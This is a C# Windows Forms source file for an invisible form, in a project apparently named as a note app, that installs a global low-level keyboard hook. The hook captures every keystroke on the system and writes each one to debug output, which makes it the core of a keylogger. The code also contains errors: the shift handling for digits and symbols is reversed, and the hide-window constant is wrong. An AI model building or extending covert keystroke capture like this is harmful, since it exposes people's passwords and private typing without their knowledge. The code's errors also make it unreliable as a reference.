using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NoteIT
{
    public partial class Subform : Form
    {
        private static Keys[] notneeded = {Keys.LControlKey, Keys.RControlKey};
        private static bool CapsPressed = Control.IsKeyLocked(Keys.CapsLock);
        private static bool ShiftPressed;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public Subform()
        {
            var handle = GetConsoleWindow();
            _hookID = SetHook(_proc);
            //UnhookWindowsHookEx(_hookID);
            InitializeComponent();
            this.Visible = false;
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                Debug.WriteLine("here");
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
            
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                if (notneeded.Contains((Keys)vkCode))
                {
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                if (Keys.Shift == Control.ModifierKeys) ShiftPressed = true;
                else ShiftPressed = false;
                if ((Keys)vkCode == Keys.CapsLock)
                {
                    CapsPressed = !CapsPressed;
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        Debug.WriteLine(" ");
                        break;
                    case Keys.Return:
                        Debug.WriteLine("\n");
                        break;
                    case Keys.Back:
                        Debug.WriteLine("~bkspc~");
                        break;
                    case Keys.Tab:
                        Debug.WriteLine("~TAB~");
                        break;
                    case Keys.D0:
                        if (ShiftPressed) Debug.WriteLine("0");
                        else Debug.WriteLine(")");
                        break;
                    case Keys.D1:
                        if (ShiftPressed) Debug.WriteLine("1");
                        else Debug.WriteLine("!");
                        break;
                    case Keys.D2:
                        if (ShiftPressed) Debug.WriteLine("2");
                        else Debug.WriteLine("@");
                        break;
                    case Keys.D3:
                        if (ShiftPressed) Debug.WriteLine("3");
                        else Debug.WriteLine("#");
                        break;
                    case Keys.D4:
                        if (ShiftPressed) Debug.WriteLine("4");
                        else Debug.WriteLine("$");
                        break;
                    case Keys.D5:
                        if (ShiftPressed) Debug.WriteLine("5");
                        else Debug.WriteLine("%");
                        break;
                    case Keys.D6:
                        if (ShiftPressed) Debug.WriteLine("6");
                        else Debug.WriteLine("^");
                        break;
                    case Keys.D7:
                        if (ShiftPressed) Debug.WriteLine("7");
                        else Debug.WriteLine("&");
                        break;
                    case Keys.D8:
                        if (ShiftPressed) Debug.WriteLine("8");
                        else Debug.WriteLine("*");
                        break;
                    case Keys.D9:
                        if (ShiftPressed) Debug.WriteLine("9");
                        else Debug.WriteLine("(");
                        break;
                    case Keys.LShiftKey:

                    case Keys.RShiftKey:

                        Debug.WriteLine("");
                        break;
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Delete:
                        Debug.WriteLine("~Delete~");
                        break;
                    case Keys.OemQuestion:
                        if (ShiftPressed) Debug.WriteLine("/");
                        else Debug.WriteLine("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (ShiftPressed) Debug.WriteLine("[");
                        else Debug.WriteLine("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (ShiftPressed) Debug.WriteLine("]");
                        else Debug.WriteLine("}");
                        break;
                    case Keys.Oem1:
                        if (ShiftPressed) Debug.WriteLine(";");
                        else Debug.WriteLine(":");
                        break;
                    case Keys.Oem7:
                        if (ShiftPressed) Debug.WriteLine("'");
                        else Debug.WriteLine('"');
                        break;
                    case Keys.Oemcomma:
                        if (ShiftPressed) Debug.WriteLine(",");
                        else Debug.WriteLine("<");
                        break;
                    case Keys.OemPeriod:
                        if (ShiftPressed) Debug.WriteLine(".");
                        else Debug.WriteLine(">");
                        break;
                    case Keys.OemMinus:
                        if (ShiftPressed) Debug.WriteLine("-");
                        else Debug.WriteLine("_");
                        break;
                    case Keys.Oemplus:
                        if (ShiftPressed) Debug.WriteLine("=");
                        else Debug.WriteLine("+");
                        break;
                    case Keys.Oemtilde:
                        if (ShiftPressed) Debug.WriteLine("`");
                        else Debug.WriteLine("~");
                        break;
                    case Keys.Oem5:
                        Debug.WriteLine("|");
                        break;
                    case Keys.Capital:
                        {
                            if (CapsPressed) CapsPressed = false;
                            else CapsPressed = true;
                        }
                        break;
                    case Keys.Left:
                        Debug.WriteLine("~Left~");
                        break;
                    case Keys.Right:
                        Debug.WriteLine("~Right~");
                        break;
                    case Keys.Up:
                        Debug.WriteLine("~Up~");
                        break;
                    case Keys.Down:
                        Debug.WriteLine("~Down~");
                        break;
                    case Keys.Home:
                        Debug.WriteLine("~Home~");
                        break;
                    case Keys.End:
                        Debug.WriteLine("~End~");
                        break;
                    case Keys.PageDown:
                        Debug.WriteLine("~PageDown~");
                        break;
                    case Keys.PageUp:
                        Debug.WriteLine("~PageUp~");
                        break;
                    case Keys.OemBackslash:
                        if (ShiftPressed) Debug.WriteLine("|");
                        else Debug.WriteLine("\\");
                        break;
                    default:
                        {
                            if (ShiftPressed && CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToLower());
                            if (!ShiftPressed && CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToUpper());
                            if (ShiftPressed && !CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToUpper());
                            if (!ShiftPressed && !CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToLower());
                        }
                        break;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 1;




    }
}
